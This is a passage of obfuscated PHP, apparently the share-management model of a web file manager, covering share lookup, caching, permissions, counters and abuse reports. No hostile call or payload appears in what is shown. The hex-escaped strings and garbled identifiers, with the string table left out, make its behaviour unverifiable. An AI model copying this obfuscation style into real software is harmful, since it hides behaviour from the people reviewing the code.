"\163\x68\x61\162\x65"; protected $dataAuto = array(array("\155\x6f\x64\151\146\x79\124\151\155\x65", "\x74\x69\155\145", "\x69\x6e\163\145\x72\164\54\165\x70\144\x61\164\145", "\146\165\156\143\164\151\157\156"), array("\143\162\145\x61\x74\x65\x54\151\x6d\x65", "\x74\x69\x6d\x65", "\151\156\x73\x65\162\x74", "\x66\165\156\x63\164\151\157\x6e"), array("\x6f\x70\x74\151\x6f\156\x73", '', "\151\x6e\163\145\162\164\54\x75\x70\x64\x61\x74\145\x2c\x73\145\154\x65\143\x74", "\152\163\x6f\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($îíË…á¾) { $¼²ìä =& $_SERVER[®»±”ó²]; $¨±ûïÔ© = isset($îíË…á¾[0]) ? $îíË…á¾[0] : !1; $¼ì¥Ë = $¼²ìä[2134] . USER_ID; return array($¼²ìä[2135] => array(USER_ID, $¼²ìä[2136]), $¼²ìä[2075] => array($¨±ûïÔ©, $¼²ìä[2137], $¼ì¥Ë)); } protected function listSimple() { $»÷¾‹À‹ = array($_SERVER[®»±”ó²][1791] => USER_ID); $‘¢á‰®Û = $this->field($this->fieldList)->where($»÷¾‹À‹)->select(); return $‘¢á‰®Û ? $‘¢á‰®Û : array(); } protected function getInfo($·Ëü«®, $Êê½€ç½ = false, $è˜ƒıœÕ = '') { $åÔ³âô³ =& $_SERVER[®»±”ó²]; if (!$è˜ƒıœÕ) { $è˜ƒıœÕ = $åÔ³âô³[2134] . USER_ID; } if ($Êê½€ç½) { return $this->_getShareInfo(array($åÔ³âô³[681] => $·Ëü«®)); } $»–…¤¯ = $this->cacheFunctionGet($åÔ³âô³[2077], $·Ëü«®, $è˜ƒıœÕ); $’‹ïŞÕÉ = $this->shareInfoMofify($»–…¤¯, $åÔ³âô³[226]); if (isset($»–…¤¯[$åÔ³âô³[88]]) && $’‹ïŞÕÉ != $»–…¤¯[$åÔ³âô³[88]]) { $áÛÜêğ = $this->cacheKeyMake($åÔ³âô³[2077], $·Ëü«®, $è˜ƒıœÕ); $»–…¤¯ = $this->_getShareInfo(array($åÔ³âô³[681] => $·Ëü«®)); Cache::set($áÛÜêğ, $»–…¤¯); } return $»–…¤¯; } private function shareInfoMofify(&$‚¡Ëê×ó, $·çàĞ® = "\x67\x65\x74") { $¢Õ±“Â– =& $_SERVER[®»±”ó²]; if (!$‚¡Ëê×ó || !isset($‚¡Ëê×ó[$¢Õ±“Â–[681]])) { return; } $ÊíÜ’® = $¢Õ±“Â–[2138] . $‚¡Ëê×ó[$¢Õ±“Â–[681]]; if ($·çàĞ® == $¢Õ±“Â–[226]) { return Cache::get($ÊíÜ’®); } else { if ($·çàĞ® == $¢Õ±“Â–[2106]) { $ı„‹¹ö = Cache::get($ÊíÜ’®); if ($ı„‹¹ö === $‚¡Ëê×ó[$¢Õ±“Â–[88]]) { return; } $‚¡Ëê×ó[$¢Õ±“Â–[2139]] = USER_ID . $¢Õ±“Â–[464] . $‚¡Ëê×ó[$¢Õ±“Â–[88]]; Cache::set($ÊíÜ’®, $‚¡Ëê×ó[$¢Õ±“Â–[88]]); } else { if ($·çàĞ® == $¢Õ±“Â–[2140]) { Cache::remove($ÊíÜ’®); } } } } public function getInfoByHash($ŠòÊä€ä) { return $this->_getShareInfo(array($_SERVER[®»±”ó²][2141] => $ŠòÊä€ä)); } public function getInfoByPath($Ï¼—ä†) { $”¼¡İíÀ =& $_SERVER[®»±”ó²]; $¬úü’ëğ = array($”¼¡İíÀ[1791] => USER_ID, $”¼¡İíÀ[194] => $Ï¼—ä†); return $this->_getShareInfo($¬úü’ëğ); } public function getInfoBySourcePath($ç‰ã÷Š­) { $Ê«ş„õ½ =& $_SERVER[®»±”ó²]; $Îƒ¡ñíÄ = array($Ê«ş„õ½[1791] => USER_ID, $Ê«ş„õ½[1269] => $ç‰ã÷Š­); return $this->_getShareInfo($Îƒ¡ñíÄ); } private function _getShareInfo($‡ëÌ­¢Ö) { $ÉŞ’–ƒê =& $_SERVER[®»±”ó²]; $Ü¥ï÷”Á = $this->where($‡ëÌ­¢Ö)->find(); if (!$Ü¥ï÷”Á) { return !1; } $‡ëÌ­¢Ö = array($ÉŞ’–ƒê[681] => $Ü¥ï÷”Á[$ÉŞ’–ƒê[681]]); $¦·Ó™ãÇ = $ÉŞ’–ƒê[2142]; $Ì¥Ñ¤Øù = Model($ÉŞ’–ƒê[682])->order($ÉŞ’–ƒê[477])->field($¦·Ó™ãÇ)->where($‡ëÌ­¢Ö)->select(); if ($Ü¥ï÷”Á[$ÉŞ’–ƒê[194]] == $ÉŞ’–ƒê[231]) { $Ü¥ï÷”Á[$ÉŞ’–ƒê[90]] = IO::info($Ü¥ï÷”Á[$ÉŞ’–ƒê[1269]]); } else { $Ü¥ï÷”Á[$ÉŞ’–ƒê[90]] = Model($ÉŞ’–ƒê[1440])->pathInfo($Ü¥ï÷”Á[$ÉŞ’–ƒê[194]]); } $Ü¥ï÷”Á[$ÉŞ’–ƒê[2143]] = $Ì¥Ñ¤Øù; $this->shareInfoMofify($Ü¥ï÷”Á, $ÉŞ’–ƒê[2106]); return $Ü¥ï÷”Á; } protected function getInfoAuth($è‰±˜Ã) { $Ê£ñ€Ã =& $_SERVER[®»±”ó²]; $×ƒîÜÇµ = $this->getInfo($è‰±˜Ã); if ($×ƒîÜÇµ[$Ê£ñ€Ã[1791]] == USER_ID) { $×ƒîÜÇµ[$Ê£ñ€Ã[498]] = $×ƒîÜÇµ[$Ê£ñ€Ã[90]][$Ê£ñ€Ã[498]]; } else { $×ƒîÜÇµ[$Ê£ñ€Ã[498]] = Model($Ê£ñ€Ã[580])->authMake($×ƒîÜÇµ[$Ê£ñ€Ã[2143]]); } return $×ƒîÜÇµ; } protected function listData($ŒøÜ÷úİ = null, $Ù›ë·Å¾ = 300) { $Ó™Û ûâ =& $_SERVER[®»±”ó²]; $ÇŞ‹ğöü = array(array($Ó™Û ûâ[575] => array($Ó™Û ûâ[1099], 0), $Ó™Û ûâ[679] => array($Ó™Û ûâ[1099], 0), $Ó™Û ûâ[2144] => $Ó™Û ûâ[2094])); if ($ŒøÜ÷úİ == $Ó™Û ûâ[2145]) { $ÇŞ‹ğöü = array($Ó™Û ûâ[575] => 1); } else { if ($ŒøÜ÷úİ == $Ó™Û ûâ[1252]) { $ÇŞ‹ğöü = array($Ó™Û ûâ[679] => 1); } } $ÇŞ‹ğöü[$Ó™Û ûâ[1791]] = USER_ID; $Ô´µ‚é = $this->where($ÇŞ‹ğöü)->selectPage($Ù›ë·Å¾); return $Ô´µ‚é; } protected function listToMe($Ï××àÊ³ = 300) { $õèò±´­ =& $_SERVER[®»±”ó²]; $ÂË‚ºéÚ = Model($õèò±´­[2146])->userGroupParents(USER_ID); $ƒ¬ç‰—í = array($õèò±´­[664] => SourceModel::TYPE_USER, $õèò±´­[582] => USER_ID); if ($ÂË‚ºéÚ) { $ƒ¬ç‰—í = array(array($õèò±´­[664] => SourceModel::TYPE_USER, $õèò±´­[582] => USER_ID), array($õèò±´­[664] => SourceModel::TYPE_GROUP, $õèò±´­[582] => array($õèò±´­[7], $ÂË‚ºéÚ)), $õèò±´­[2144] => $õèò±´­[2094]); } $¸®¥ÊÎ = Model($õèò±´­[682])->where($ƒ¬ç‰—í)->selectPage($Ï××àÊ³); $÷ŞÖ©›Á = array_to_keyvalue_group($¸®¥ÊÎ[$õèò±´­[447]], $õèò±´­[681]); if (!$÷ŞÖ©›Á) { return $¸®¥ÊÎ; } $˜şß·¿Õ = $õèò±´­[2147]; $ƒ¬ç‰—í = array($õèò±´­[681] => array($õèò±´­[503], array_keys($÷ŞÖ©›Á)), $õèò±´­[1791] => array($õèò±´­[1101], $õèò±´­[231])); $Ú¼ÄºöÉ = $this->field($˜şß·¿Õ)->where($ƒ¬ç‰—í)->select(); foreach ($Ú¼ÄºöÉ as $·ß½®âÒ => &$ä·ƒÏï) { $ä·ƒÏï[$õèò±´­[2143]] = $÷ŞÖ©›Á[$ä·ƒÏï[$õèò±´­[681]]]; } unset($ä·ƒÏï); $Ââ¨×Äı = array($õèò±´­[2148] => $Ú¼ÄºöÉ, $õèò±´­[2149] => $¸®¥ÊÎ[$õèò±´­[444]]); return $Ââ¨×Äı; } protected function shareAdd($³£Ò„Ìş, $„ûôíåæ) { $£¼µúæ¨ =& $_SERVER[®»±”ó²]; $÷«¿»Ô = $this->_addShareData($³£Ò„Ìş, $„ûôíåæ); if (!empty($„ûôíåæ[$£¼µúæ¨[2150]])) { $this->_shareAuthSet($÷«¿»Ô, $„ûôíåæ[$£¼µúæ¨[2150]]); } $this->shareEventAdd($³£Ò„Ìş, $„ûôíåæ, $£¼µúæ¨[2151]); return $÷«¿»Ô; } protected function shareAddSystem($‚ë“øùÃ, $‚ôæ«› ) { $äòôÒ™¡ =& $_SERVER[®»±”ó²]; $ÜÅ¸£ = $this->_addShareData($‚ë“øùÃ, $‚ôæ«› , $äòôÒ™¡[192]); $this->_shareAuthSet($ÜÅ¸£, $‚ôæ«› [$äòôÒ™¡[2150]]); return $ÜÅ¸£; } private function shareEventAdd($¤Ù±Ş¡ø, $·¦ÂÔ×Î, $¬ø‡ÀµŞ = "\141\144\x64") { $äÛÁ£Ä =& $_SERVER[®»±”ó²]; if (!$¤Ù±Ş¡ø || $¤Ù±Ş¡ø == $äÛÁ£Ä[231]) { return; } if ($¬ø‡ÀµŞ == $äÛÁ£Ä[2151]) { if ($·¦ÂÔ×Î[$äÛÁ£Ä[575]] == $äÛÁ£Ä[91]) { Model($äÛÁ£Ä[649])->eventShare($¤Ù±Ş¡ø, $äÛÁ£Ä[2152]); } if ($·¦ÂÔ×Î[$äÛÁ£Ä[679]] == $äÛÁ£Ä[91]) { Model($äÛÁ£Ä[649])->eventShare($¤Ù±Ş¡ø, $äÛÁ£Ä[2153]); } return; } $©¹èò¢ = $this->getInfoByPath($¤Ù±Ş¡ø); $Çõ®ùÎÇ = $äÛÁ£Ä[2154]; if ($©¹èò¢[$äÛÁ£Ä[575]] == $äÛÁ£Ä[231] && $·¦ÂÔ×Î[$äÛÁ£Ä[575]] == $äÛÁ£Ä[91]) { $Çõ®ùÎÇ = $äÛÁ£Ä[2152]; } if ($©¹èò¢[$äÛÁ£Ä[575]] == $äÛÁ£Ä[91] && $·¦ÂÔ×Î[$äÛÁ£Ä[575]] == $äÛÁ£Ä[231]) { $Çõ®ùÎÇ = $äÛÁ£Ä[2155]; } if ($©¹èò¢[$äÛÁ£Ä[679]] == $äÛÁ£Ä[231] && $·¦ÂÔ×Î[$äÛÁ£Ä[679]] == $äÛÁ£Ä[91]) { $Çõ®ùÎÇ = $äÛÁ£Ä[2153]; } if ($©¹èò¢[$äÛÁ£Ä[679]] == $äÛÁ£Ä[91] && $·¦ÂÔ×Î[$äÛÁ£Ä[679]] == $äÛÁ£Ä[231]) { $Çõ®ùÎÇ = $äÛÁ£Ä[2156]; } Model($äÛÁ£Ä[649])->eventShare($¤Ù±Ş¡ø, $Çõ®ùÎÇ); return; } private function _addShareData($‡˜äÔÕÓ, $³–Î±¹ù = array(), $Òü„œ´­ = false) { $ıµÔÑŒª =& $_SERVER[®»±”ó²]; $Ş§×¾¤ = $Òü„œ´­ == $ıµÔÑŒª[192] ? 0 : USER_ID; $‰åŸ”Å = array($ıµÔÑŒª[502] => $‡˜äÔÕÓ, $ıµÔÑŒª[1782] => $Ş§×¾¤); if ($‡˜äÔÕÓ == 0) { $‰åŸ”Å = array($ıµÔÑŒª[2157] => $³–Î±¹ù[$ıµÔÑŒª[1269]], $ıµÔÑŒª[1782] => $Ş§×¾¤); } if ($…³ÄÑ¯Û = $this->where($‰åŸ”Å)->find()) { return $…³ÄÑ¯Û[$ıµÔÑŒª[681]]; } if ($‡˜äÔÕÓ == 0) { $ˆÍ¾•ŸÙ = array($ıµÔÑŒª[32] => get_path_this($³–Î±¹ù[$ıµÔÑŒª[87]])); } else { $ˆÍ¾•ŸÙ = Model($ıµÔÑŒª[911])->sourceInfo($‡˜äÔÕÓ); if (!$ˆÍ¾•ŸÙ) { return !1; } } if (!$³–Î±¹ù[$ıµÔÑŒª[1678]]) { $³–Î±¹ù[$ıµÔÑŒª[1678]] = $ˆÍ¾•ŸÙ[$ıµÔÑŒª[32]]; } $¡ÛôÅ“‘ = array($ıµÔÑŒª[1782] => $Ş§×¾¤, $ıµÔÑŒª[502] => $‡˜äÔÕÓ, $ıµÔÑŒª[1678] => $ıµÔÑŒª[12], $ıµÔÑŒª[575] => 0, $ıµÔÑŒª[679] => 0, $ıµÔÑŒª[1269] => $ıµÔÑŒª[12], $ıµÔÑŒª[384] => $ıµÔÑŒª[12], $ıµÔÑŒª[976] => $ıµÔÑŒª[12], $ıµÔÑŒª[2158] => 0, $ıµÔÑŒª[2159] => 0, $ıµÔÑŒª[842] => 0, $ıµÔÑŒª[2160] => $ıµÔÑŒª[12], $ıµÔÑŒª[2141] => $ıµÔÑŒª[12]); $€ÜÚ²Ùô = explode($ıµÔÑŒª[50], $ıµÔÑŒª[2161]); foreach ($€ÜÚ²Ùô as $£øãûšØ) { if (!isset($³–Î±¹ù[$£øãûšØ])) { continue; } $¡ÛôÅ“‘[$£øãûšØ] = $³–Î±¹ù[$£øãûšØ]; } $ëÔİ•õ = $this->add($¡ÛôÅ“‘); $ÑêõØğ = array($ıµÔÑŒª[2141] => short_id($ëÔİ•õ)); $this->where(array($ıµÔÑŒª[2162] => $ëÔİ•õ))->save($ÑêõØğ); return $ëÔİ•õ; } private function _shareAuthSet($ß£í—“ò, $èØ’šÛ) { $îáÇÍß˜ =& $_SERVER[®»±”ó²]; if (!is_array($èØ’šÛ)) { return !1; } $¢ôÉ‰¿µ = Model($îáÇÍß˜[2104]); $¢ôÉ‰¿µ->where(array($îáÇÍß˜[681] => $ß£í—“ò))->delete(); $ÖîšÖË = array(); foreach ($èØ’šÛ as $µ¼ÂæÊ«) { $«éç¸›¯ = SourceModel::TYPE_USER; if ($µ¼ÂæÊ«[$îáÇÍß˜[191]] == SourceModel::TYPE_GROUP) { $«éç¸›¯ = SourceModel::TYPE_GROUP; } $•î‡€àí = array($îáÇÍß˜[681] => $ß£í—“ò, $îáÇÍß˜[191] => $«éç¸›¯, $îáÇÍß˜[582] => intval($µ¼ÂæÊ«[$îáÇÍß˜[582]]), $îáÇÍß˜[2100] => 0, $îáÇÍß˜[2163] => -1); if ($µ¼ÂæÊ«[$îáÇÍß˜[2100]]) { $•î‡€àí[$îáÇÍß˜[2100]] = $µ¼ÂæÊ«[$îáÇÍß˜[2100]]; } else { if ($µ¼ÂæÊ«[$îáÇÍß˜[2163]]) { $•î‡€àí[$îáÇÍß˜[2163]] = $µ¼ÂæÊ«[$îáÇÍß˜[2163]]; } } $ÖîšÖË[] = $•î‡€àí; } return $¢ôÉ‰¿µ->addAll($ÖîšÖË, array(), !0); } public function numViewAdd($ÜÜì¿ĞØ) { $±Üùüôˆ =& $_SERVER[®»±”ó²]; $²ÖÀ×§ = array($±Üùüôˆ[2162] => $ÜÜì¿ĞØ); $this->where($²ÖÀ×§)->setAdd($±Üùüôˆ[2158]); } public function numDownloadAdd($øïÛäÜª) { $‡Ú”æ¯à =& $_SERVER[®»±”ó²]; $¿¿ëĞ¯‰ = array($‡Ú”æ¯à[2162] => $øïÛäÜª); $this->where($¿¿ëĞ¯‰)->setAdd($‡Ú”æ¯à[2159]); } protected function shareEdit($†¤ÜŠşé, $·”±Î“) { $Ó™§®æº =& $_SERVER[®»±”ó²]; $ö®»Ó·í = $this->getInfo($†¤ÜŠşé); if (!$ö®»Ó·í) { return !1; } $this->_checkLinkShare($·”±Î“, $ö®»Ó·í); $Òæ¯š§ = array(); $„–â‚÷¢ = explode($Ó™§®æº[50], $Ó™§®æº[2164]); foreach ($„–â‚÷¢ as $°Ø»äË) { if (!array_key_exists($°Ø»äË, $·”±Î“)) { continue; } $Òæ¯š§[$°Ø»äË] = $·”±Î“[$°Ø»äË]; } $this->shareEventAdd($ö®»Ó·í[$Ó™§®æº[194]], $·”±Î“, $Ó™§®æº[1961]); $this->where(array($Ó™§®æº[2162] => $†¤ÜŠşé))->save($Òæ¯š§); if (isset($·”±Î“[$Ó™§®æº[2150]])) { $this->_shareAuthSet($†¤ÜŠşé, $·”±Î“[$Ó™§®æº[2150]]); } return !0; } private function _checkLinkShare($Æ¸œµÏŒ, $ıÑëÌ¥¿) { $¦ı„»ÚÈ =& $_SERVER[®»±”ó²]; if ($Æ¸œµÏŒ[$¦ı„»ÚÈ[575]] != $¦ı„»ÚÈ[91]) { return; } $İÑ²ª¿Í = $ıÑëÌ¥¿[$¦ı„»ÚÈ[90]][$¦ı„»ÚÈ[194]]; if ($ıÑëÌ¥¿[$¦ı„»ÚÈ[90]][$¦ı„»ÚÈ[33]] != $¦ı„»ÚÈ[233]) { $¹ïöÓ = $this->_folderReport($İÑ²ª¿Í); if (!$¹ïöÓ) { return; } show_json(LNG($¦ı„»ÚÈ[2165]) . $¦ı„»ÚÈ[2166] . $¹ïöÓ, !1); } $ß“¨†¤· = Model($¦ı„»ÚÈ[911])->fileInfoGet($ıÑëÌ¥¿[$¦ı„»ÚÈ[90]][$¦ı„»ÚÈ[194]]); if (!$ß“¨†¤·) { return; } $™æº³Ò˜ = $this->shareFileMeta($ß“¨†¤·[$¦ı„»ÚÈ[554]]); if (isset($™æº³Ò˜[$¦ı„»ÚÈ[452]]) && $™æº³Ò˜[$¦ı„»ÚÈ[452]] == $¦ı„»ÚÈ[91]) { show_json(LNG($¦ı„»ÚÈ[2167]), !1); } } private function _folderReport($ùÍ‚ØìŞ) { $µË†¢«³ =& $_SERVER[®»±”ó²]; $ÄØºÚˆ´ = array($µË†¢«³[554] => array($µË†¢«³[1099], 0), $µË†¢«³[830] => 3); $êü³ÏÛ« = Model($µË†¢«³[2168])->where($ÄØºÚˆ´)->field($µË†¢«³[554])->select(); if (!$êü³ÏÛ«) { return !1; } $êü³ÏÛ« = array_to_keyvalue($êü³ÏÛ«, $µË†¢«³[12], $µË†¢«³[554]); $”Ôé¨ = $µË†¢«³[50] . $ùÍ‚ØìŞ . $µË†¢«³[50]; $ÄØºÚˆ´ = array($µË†¢«³[554] => array($µË†¢«³[7], $êü³ÏÛ«), $µË†¢«³[597] => array($µË†¢«³[461], "\45{$”Ôé¨}\45"), $µË†¢«³[516] => 0); $ü›×¹­ = Model($µË†¢«³[911])->where($ÄØºÚˆ´)->field($µË†¢«³[2169])->find(); if (!$ü›×¹­) { return !1; } $©¥–€Ì = substr($ü›×¹­[$µË†¢«³[597]], strpos($ü›×¹­[$µË†¢«³[597]], $”Ôé¨)); $ÄØºÚˆ´ = array($µË†¢«³[194] => array($µË†¢«³[7], trim($©¥–€Ì, $µË†¢«³[50]))); $Ï›§ı¬ï = Model($µË†¢«³[911])->where($ÄØºÚˆ´)->field($µË†¢«³[32])->select(); $®®¡‰Æ³ = array_to_keyvalue($Ï›§ı¬ï, $µË†¢«³[12], $µË†¢«³[32]); $®®¡‰Æ³[] = $ü›×¹­[$µË†¢«³[32]]; return implode($µË†¢«³[8], $®®¡‰Æ³); } protected function remove($€¶¦ç‡‡) { $µ ›¹Ğš =& $_SERVER[®»±”ó²]; $ó£ÂÆ³¹ = is_array($€¶¦ç‡‡) ? $€¶¦ç‡‡ : array($€¶¦ç‡‡); for ($œæÉ“ = 0; $œæÉ“ < count($ó£ÂÆ³¹); $œæÉ“++) { $ŞÉ¬ã”’ = $this->getInfo($ó£ÂÆ³¹[$œæÉ“]); if ($ŞÉ¬ã”’[$µ ›¹Ğš[679]] == $µ ›¹Ğš[91]) { Model($µ ›¹Ğš[649])->eventShare($ŞÉ¬ã”’[$µ ›¹Ğš[194]], $µ ›¹Ğš[2156]); } if ($ŞÉ¬ã”’[$µ ›¹Ğš[575]] == $µ ›¹Ğš[91]) { Model($µ ›¹Ğš[649])->eventShare($ŞÉ¬ã”’[$µ ›¹Ğš[194]], $µ ›¹Ğš[2155]); } $this->shareInfoMofify($ŞÉ¬ã”’, $µ ›¹Ğš[2140]); } $ ÄÓÃØÉ = array($µ ›¹Ğš[681] => array($µ ›¹Ğš[7], $ó£ÂÆ³¹)); $Áûš‹• = $this->where($ ÄÓÃØÉ)->delete(); if ($Áûš‹•) { Model($µ ›¹Ğš[682])->where($ ÄÓÃØÉ)->delete(); } return $Áûš‹•; } protected function removeBySource($öÎ™“‡) { $ş•€Êù =& $_SERVER[®»±”ó²]; $îæ  ¤ = array($ş•€Êù[502] => array($ş•€Êù[503], $öÎ™“‡)); $°‡Ù–ô = $this->field($ş•€Êù[681])->where($îæ  ¤)->select(); $ï£øŞÔµ = array_to_keyvalue($°‡Ù–ô, $ş•€Êù[12], $ş•€Êù[681]); if (!$ï£øŞÔµ) { return; } foreach ($°‡Ù–ô as $â‰…ˆ¡é) { $this->shareInfoMofify($â‰…ˆ¡é, $ş•€Êù[2140]); } $îæ  ¤ = array($ş•€Êù[2162] => array($ş•€Êù[503], $ï£øŞÔµ)); $this->where($îæ  ¤)->delete(); Model($ş•€Êù[682])->where($îæ  ¤)->delete(); } public function listAll($ŒÔô‹İ) { $ú«ºÀò„ =& $_SERVER[®»±”ó²]; $¢Šö§®ê = array(); if ($ŒÔô‹İ[$ú«ºÀò„[1791]]) { $¢Šö§®ê[$ú«ºÀò„[1791]] = $ŒÔô‹İ[$ú«ºÀò„[1791]]; } if ($ŒÔô‹İ[$ú«ºÀò„[841]]) { $ßÍÊ›ÛÁ = $ŒÔô‹İ[$ú«ºÀò„[842]] ? $ŒÔô‹İ[$ú«ºÀò„[842]] : strtotime(date($ú«ºÀò„[2170])); $¢Šö§®ê[$ú«ºÀò„[234]] = array($ú«ºÀò„[410], array($ŒÔô‹İ[$ú«ºÀò„[841]], $ßÍÊ›ÛÁ)); } if ($ŒÔô‹İ[$ú«ºÀò„[33]]) { $¢Šö§®ê[$ŒÔô‹İ[$ú«ºÀò„[33]]] = 1; } else { $¢Šö§®ê[] = array($ú«ºÀò„[575] => array($ú«ºÀò„[1099], 0), $ú«ºÀò„[679] => array($ú«ºÀò„[1099], 0), $ú«ºÀò„[2144] => $ú«ºÀò„[2094]); } if ($ŒÔô‹İ[$ú«ºÀò„[2090]]) { $¢Šö§®ê[] = array($ú«ºÀò„[2141] => $ŒÔô‹İ[$ú«ºÀò„[2090]], $ú«ºÀò„[1678] => array($ú«ºÀò„[461], "\x25{$ŒÔô‹İ[$ú«ºÀò„[2090]]}\x25"), $ú«ºÀò„[2144] => $ú«ºÀò„[2094]); } $©™üµˆ = $this->_makeOrder()->where($¢Šö§®ê)->selectPage(20); if (empty($©™üµˆ[$ú«ºÀò„[447]])) { return array(); } $this->_listDataApply($©™üµˆ[$ú«ºÀò„[447]]); return $©™üµˆ; } public function listDataApply($áä§‹ƒğ) { $this->_listDataApply($áä§‹ƒğ); return $áä§‹ƒğ; } private function _listDataApply(&$Ü‹áÛ²ê) { $³½®â»µ =& $_SERVER[®»±”ó²]; $µ¬²©Éó = array_to_keyvalue($Ü‹áÛ²ê, $³½®â»µ[12], $³½®â»µ[1791]); $¶ØÒñ…å = Model($³½®â»µ[610])->userListInfo(array_unique($µ¬²©Éó)); $¯€ï‡½† = array_to_keyvalue($Ü‹áÛ²ê, $³½®â»µ[12], $³½®â»µ[194]); $Æƒ·ù†Å = Model($³½®â»µ[911])->sourceListInfo($¯€ï‡½†, !0); foreach ($Ü‹áÛ²ê as $Ü¶İ˜€³ => &$ŠºàÖìã) { $™­ö‡‰¦ = $ŠºàÖìã[$³½®â»µ[1791]]; $ŠºàÖìã[$³½®â»µ[2171]] = $¶ØÒñ…å[$™­ö‡‰¦] ? $¶ØÒñ…å[$™­ö‡‰¦] : !1; if (!$ŠºàÖìã[$³½®â»µ[2171]] || $ŠºàÖìã[$³½®â»µ[2171]][$³½®â»µ[830]] != $³½®â»µ[91]) { unset($Ü‹áÛ²ê[$Ü¶İ˜€³]); continue; } $ÉŒ¿é÷Œ = $ŠºàÖìã[$³½®â»µ[194]]; $ŠºàÖìã[$³½®â»µ[90]] = $Æƒ·ù†Å[$ÉŒ¿é÷Œ] ? $Æƒ·ù†Å[$ÉŒ¿é÷Œ] : !1; if ($ŠºàÖìã[$³½®â»µ[90]][$³½®â»µ[516]] == $³½®â»µ[91]) { unset($Ü‹áÛ²ê[$Ü¶İ˜€³]); } if ($ŠºàÖìã[$³½®â»µ[90]] != $³½®â»µ[231] && !$ŠºàÖìã[$³½®â»µ[90]]) { unset($Ü‹áÛ²ê[$Ü¶İ˜€³]); } } unset($ŠºàÖìã); $Ü‹áÛ²ê = array_values($Ü‹áÛ²ê); } private function _makeOrder($Ó×‘„¯¯ = '') { $ñ¾‹ş®å =& $_SERVER[®»±”ó²]; $ÕÇâœ¨ = array($ñ¾‹ş®å[234], $ñ¾‹ş®å[842], $ñ¾‹ş®å[2158], $ñ¾‹ş®å[2159]); $²–³€ª¼ = array($ñ¾‹ş®å[534] => $ñ¾‹ş®å[535], $ñ¾‹ş®å[536] => $ñ¾‹ş®å[537]); $¡ÆÇ¯Í = Input::get($ñ¾‹ş®å[541], $ñ¾‹ş®å[7], $ñ¾‹ş®å[508], $ÕÇâœ¨); $ı¡ÏÍö = Input::get($ñ¾‹ş®å[542], $ñ¾‹ş®å[7], $ñ¾‹ş®å[2172], array($ñ¾‹ş®å[2087], $ñ¾‹ş®å[536])); $ı¡ÏÍö = $²–³€ª¼[$ı¡ÏÍö]; $Ó×‘„¯¯ = $Ó×‘„¯¯ . "{$¡ÆÇ¯Í}\x20{$ı¡ÏÍö}"; return $this->order($Ó×‘„¯¯); } public function reportAdd($ü¯¬­Ä—) { $–¾ï¸°£ =& $_SERVER[®»±”ó²]; $æƒş´˜ = array($–¾ï¸°£[681] => $ü¯¬­Ä—[$–¾ï¸°£[681]], $–¾ï¸°£[1791] => USER_ID); if (Model($–¾ï¸°£[2168])->where($æƒş´˜)->find()) { return !1; } $ç Á§¡ = array($–¾ï¸°£[681] => $ü¯¬­Ä—[$–¾ï¸°£[681]], $–¾ï¸°£[1678] => $ü¯¬­Ä—[$–¾ï¸°£[1678]], $–¾ï¸°£[194] => $ü¯¬­Ä—[$–¾ï¸°£[194]], $–¾ï¸°£[554] => $ü¯¬­Ä—[$–¾ï¸°£[554]], $–¾ï¸°£[1791] => USER_ID, $–¾ï¸°£[33] => $ü¯¬­Ä—[$–¾ï¸°£[33]], $–¾ï¸°£[537] => $ü¯¬­Ä—[$–¾ï¸°£[537]]); return Model($–¾ï¸°£[2168])->add($ç Á§¡); } public function reportList($—«‰×¶¸) { $¯Í¦ÃĞ” =& $_SERVER[®»±”ó²]; $Ì¬®…ß¸ = array(); if ($—«‰×¶¸[$¯Í¦ÃĞ”[841]]) { $Çã’ßÏ¢ = $—«‰×¶¸[$¯Í¦ÃĞ”[842]] ? $—«‰×¶¸[$¯Í¦ÃĞ”[842]] : strtotime(date($¯Í¦ÃĞ”[2170])); $Ì¬®…ß¸[$¯Í¦ÃĞ”[234]] = array($¯Í¦ÃĞ”[410], array($—«‰×¶¸[$¯Í¦ÃĞ”[841]], $Çã’ßÏ¢)); } if (isset($—«‰×¶¸[$¯Í¦ÃĞ”[33]]) && in_array($—«‰×¶¸[$¯Í¦ÃĞ”[33]], array($¯Í¦ÃĞ”[91], $¯Í¦ÃĞ”[521], $¯Í¦ÃĞ”[2173], $¯Í¦ÃĞ”[2174], $¯Í¦ÃĞ”[2175]))) { $Ì¬®…ß¸[$¯Í¦ÃĞ”[33]] = $—«‰×¶¸[$¯Í¦ÃĞ”[33]]; } if (isset($—«‰×¶¸[$¯Í¦ÃĞ”[830]]) && in_array($—«‰×¶¸[$¯Í¦ÃĞ”[830]], array($¯Í¦ÃĞ”[231], $¯Í¦ÃĞ”[91], $¯Í¦ÃĞ”[521], $¯Í¦ÃĞ”[2173]))) { $Ì¬®…ß¸[$¯Í¦ÃĞ”[830]] = $—«‰×¶¸[$¯Í¦ÃĞ”[830]]; } $úğÖ—ç— = Input::get($¯Í¦ÃĞ”[542], $¯Í¦ÃĞ”[7], $¯Í¦ÃĞ”[2172], array($¯Í¦ÃĞ”[2087], $¯Í¦ÃĞ”[536])); $­Ø•ü¨¸ = array($¯Í¦ÃĞ”[534] => $¯Í¦ÃĞ”[535], $¯Í¦ÃĞ”[536] => $¯Í¦ÃĞ”[537]); $’ì˜ä… = $¯Í¦ÃĞ”[2176] . $­Ø•ü¨¸[$úğÖ—ç—]; $ä’èÍÌÒ = Model($¯Í¦ÃĞ”[2168])->where($Ì¬®…ß¸)->order($’ì˜ä…)->selectPage(20); if (empty($ä’èÍÌÒ[$¯Í¦ÃĞ”[447]])) { return array(); } $ïÏñİÕÆ = array_to_keyvalue_group($ä’èÍÌÒ[$¯Í¦ÃĞ”[447]], $¯Í¦ÃĞ”[830], $¯Í¦ÃĞ”[681]); if (!empty($ïÏñİÕÆ[0])) { $—«‰×¶¸ = $ïÏñİÕÆ[0]; $Ì¬®…ß¸ = array($¯Í¦ÃĞ”[681] => array($¯Í¦ÃĞ”[7], $—«‰×¶¸)); $ìİõ±€û = $this->where($Ì¬®…ß¸)->field($¯Í¦ÃĞ”[681])->select(); $ìİõ±€û = array_to_keyvalue($ìİõ±€û, $¯Í¦ÃĞ”[12], $¯Í¦ÃĞ”[681]); $®Í¹×Å = array_diff($—«‰×¶¸, $ìİõ±€û); if (!empty($®Í¹×Å)) { foreach ($ä’èÍÌÒ[$¯Í¦ÃĞ”[447]] as $èäŒéÏ™ => $ùßŒëï‘) { if (in_array($ùßŒëï‘[$¯Í¦ÃĞ”[681]], $®Í¹×Å)) { unset($ä’èÍÌÒ[$¯Í¦ÃĞ”[447]][$èäŒéÏ™]); } } } } 